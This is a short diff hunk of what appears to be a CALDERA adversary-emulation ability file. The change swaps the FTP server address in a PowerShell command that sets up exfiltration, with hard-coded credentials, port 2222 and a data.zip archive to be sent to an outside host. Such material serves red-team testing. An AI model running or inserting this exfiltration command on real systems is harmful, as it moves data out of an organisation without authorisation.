@@ -25,7 +25,7 @@
     additional_info: {}
     variations: []
     command: "$LogFile=\"$env:PUBLIC\\exf\\exfiltration.log\";\n$Username = \"caldera_user\"\
-      ; \n$Password = \"caldera\"; \n$Ftp = \"ftp://192.168.111.57\"; \n$FtpPort =\
+      ; \n$Password = \"caldera\"; \n$Ftp = \"ftp://172.16.16.20\"; \n$FtpPort =\
       \ \"2222\"; \n$ArchiveName = \"data.zip\"; \n$LocalStorageDir = \"$env:PUBLIC\\\
       exf\"; \n$Slash = \"/\"; \n$AntiSlash = \"\\\"; \n$Column = \":\";\n$FtpUri=\"\
       $Ftp$Column$FtpPort\"; \n$FullPathArchive = \"$LocalStorageDir$AntiSlash$ArchiveName\"\
